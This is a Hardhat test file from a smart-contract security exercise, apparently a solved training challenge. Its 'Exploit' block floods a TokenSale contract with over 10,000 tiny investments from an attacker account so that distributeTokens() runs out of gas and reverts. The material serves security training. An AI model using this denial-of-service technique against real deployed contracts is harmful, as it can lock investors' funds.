const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('DOS Exercise 1', function () {

    let deployer, user1, user2, user3, attacker;

    const USER1_INVESTMENT = ethers.utils.parseEther('5'); 
    const USER2_INVESTMENT = ethers.utils.parseEther('15');
    const USER3_INVESTMENT = ethers.utils.parseEther('23');
    
    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, user3, attacker] = await ethers.getSigners();

        const tokenSaleFactory = await ethers.getContractFactory(
            'contracts/dos-1/TokenSale.sol:TokenSale',
            deployer
        );
        this.tokenSale = await tokenSaleFactory.deploy();

        // Invest
        await this.tokenSale.connect(user1).invest({value: USER1_INVESTMENT});
        await this.tokenSale.connect(user2).invest({value: USER2_INVESTMENT});
        await this.tokenSale.connect(user3).invest({value: USER3_INVESTMENT});

        expect(await this.tokenSale.claimable(user1.address, 0)).to.be.equal(USER1_INVESTMENT.mul(5));
        expect(await this.tokenSale.claimable(user2.address, 0)).to.be.equal(USER2_INVESTMENT.mul(5));
        expect(await this.tokenSale.claimable(user3.address, 0)).to.be.equal(USER3_INVESTMENT.mul(5));
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        // Inflate the "UserInvestments Array"
        // we gonna send a lot of small investment amounts for the attacker address

        const ATTACKER_INVESTMENT = ethers.utils.parseEther('0.000000000001');
        for(var i = 0; i <= 10000; i++) {
            await this.tokenSale.connect(attacker).invest({value: ATTACKER_INVESTMENT});
        }
        
    }).timeout(100000000);

    after(async function () {
        /** SUCCESS CONDITIONS */

        // DOS to distributeTokens
        await expect(this.tokenSale.distributeTokens()).to.be.reverted;
    });
});
